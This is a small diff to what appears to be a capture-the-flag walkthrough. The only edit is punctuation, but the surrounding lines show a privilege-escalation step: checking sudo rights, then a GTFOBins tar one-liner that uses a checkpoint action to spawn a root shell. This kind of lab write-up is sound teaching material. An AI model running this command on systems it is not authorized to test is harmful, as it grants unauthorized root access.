@@ -47,7 +47,7 @@ And enter the password you got.
 
 Type sudo -l and see that we can run tar app as a root.
 Let's go to gtfobins and get the sudo exploit for tar.
-If you can't find it here type:-
+If you can't find it, here type:-
 ```bash
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
